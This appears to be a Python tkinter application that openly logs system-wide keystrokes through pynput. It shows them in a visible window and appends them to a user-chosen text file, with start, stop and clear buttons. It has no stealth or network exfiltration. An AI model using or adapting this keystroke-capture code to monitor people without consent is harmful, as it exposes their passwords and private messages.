import tkinter as tk
from tkinter import filedialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self) -> None:
        self.filename = ""
        self.is_logging = False
        self.logged_keys = ""

        self.root = tk.Tk()
        self.root.title("Keylogger")
        self.root.configure(bg="black")  # Set background color to black

        self.textbox = tk.Text(self.root, wrap="word", bg="black", fg="lime", font=("Courier", 12))
        self.textbox.grid(row=0, column=0, columnspan=4, padx=10, pady=10, sticky="nsew")  # Expand text box

        self.status_label = tk.Label(self.root, text="Logging Stopped", fg="red", bg="black", font=("Courier", 12, "bold"))
        self.status_label.grid(row=1, column=0, columnspan=4, pady=5)  # Status label spans all columns

        self.start_button = tk.Button(self.root, text="Start Logging", command=self.start_logging, bg="green", fg="black", font=("Courier", 12))
        self.start_button.grid(row=2, column=0, padx=5, pady=5, sticky="ew")  # Align start button left

        self.stop_button = tk.Button(self.root, text="Stop Logging", command=self.stop_logging, state="disabled", bg="red", fg="black", font=("Courier", 12))
        self.stop_button.grid(row=2, column=1, padx=5, pady=5, sticky="ew")  # Align stop button next to start button

        self.clear_button = tk.Button(self.root, text="Clear Logs", command=self.clear_logs, bg="blue", fg="black", font=("Courier", 12))
        self.clear_button.grid(row=2, column=2, padx=5, pady=5, sticky="ew")  # Align clear button next to stop button

        self.save_button = tk.Button(self.root, text="Choose File", command=self.choose_file, bg="yellow", fg="black", font=("Courier", 12))
        self.save_button.grid(row=2, column=3, padx=5, pady=5, sticky="ew")  # Align save button rightmost

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        char = self.get_char(key)
        self.logged_keys += char
        self.textbox.insert(tk.END, char)
        self.textbox.see(tk.END)  # Automatically scroll down
        with open(self.filename, 'a') as logs:
            logs.write(char)

    def start_logging(self):
        if not self.is_logging:
            self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                          filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
            if self.filename:
                self.is_logging = True
                self.start_button.config(state="disabled")
                self.stop_button.config(state="normal")
                self.status_label.config(text="Logging Started", fg="green")
                self.listener = keyboard.Listener(on_press=self.on_press)
                self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            self.start_button.config(state="normal")
            self.stop_button.config(state="disabled")
            self.status_label.config(text="Logging Stopped", fg="red")
            self.listener.stop()

    def clear_logs(self):
        self.logged_keys = ""
        self.textbox.delete(1.0, tk.END)

    def choose_file(self):
        self.filename = filedialog.asksaveasfilename(defaultextension=".txt",
                                                      filetypes=[("Text files", "*.txt"), ("All files", "*.*")])

    def run(self):
        # Configure row and column weights to make everything expandable
        self.root.grid_rowconfigure(0, weight=1)
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_columnconfigure(1, weight=1)
        self.root.grid_columnconfigure(2, weight=1)
        self.root.grid_columnconfigure(3, weight=1)
        
        self.root.mainloop()

if __name__ == '__main__':
    logger = KeyLoggerGUI()
    logger.run()
